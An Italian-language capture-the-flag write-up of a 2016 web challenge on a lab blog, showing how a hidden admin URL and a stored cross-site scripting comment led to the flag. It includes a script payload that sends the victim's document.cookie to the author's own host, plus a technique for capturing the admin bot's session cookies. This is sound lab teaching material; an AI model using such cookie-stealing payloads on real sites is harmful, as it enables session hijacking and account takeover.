---
layout: post
title:  "Juniors2016 - Hacker's Blog"
date:   2016-12-14 03:15
categories: CTF
tags: [Juniors2016]
categories: [Web]
author: jbz
---

*PREMESSA: per accedere a questa challenge bisognava utilizzare una VPN fornita dagli organizzatori.*

Veniva dato un sito web, `http://10.0.7.216:54337`: un blog.

Cliccando su uno dei post ho notato che l'URL era il canoninco `post.php_id=<id>`. Ho provato a forzare un errore SQL ma non era vulnerabile.

Ho notato che i vari post permettevano commenti. Ho provato ad inserire un commento e mi veniva restituito un errore in russo che tradotto diceva:

> Un amministratore deve confermare il commento.

Ho pensato quindi che il sito potrebbe essere vulnerabile a Cross Site Scripting.

Ho guardato il sorgente della pagina e ho notato questo commento:

`<!-- Secret admin panel: aHR0cDovLzEwLjAuNy4yMTY6NTQzMzcvYWRtaW42NDY0MS5waHA= -->`

Che decodificato restituisce:

`http://10.0.7.216:54337/admin64641.php`

Sono andato a quell'indirizzo e mi veniva restituito un errore (sempre in russo) che tradotto era:

> Username e password sbagliati.

Ho postato quindi un commento con questo payload (10.3.2.2. era il mio indirizzo IP):

```html
<script>document.write('<img src=http://10.3.2.2:8000/?' + document.cookie +'>')</script>
```

Ho scoperto che il cookie del bot era `login=admin`. Ho impostato il cookie, sono tornato nella pagina admin che ho trovato in precedenza, ma purtroppo ottenevo lo stesso errore.

Ho provato quindi un altro payload, per recuperare `document.location` ed ho ottenuto l'indirizzo `http://10.0.7.216:54337/bot_check.php?check=4e195228ec31dd6f3fef492`. Ho fatto una richiesta a quell'indirizzo e ho notato che il webserver mi ha settato due cookie:

```
Set-Cookie: login=admin; expires=Mon, 05-Dec-2016 19:35:19 GMT; path=/
Set-Cookie: password=e0377f6e85d987d81e96c0381c789360fe90547bdf9be3b5082a492b9c4184f7; expires=Mon, 05-Dec-2016 19:35:19 GMT; path=/
```

Con questi cookie, sono tornato alla pagina admin che ho trovato in precedenza ed ho ottenuto la flag:

> Флаг:
>
> 1true_haCkeers1337_XSS
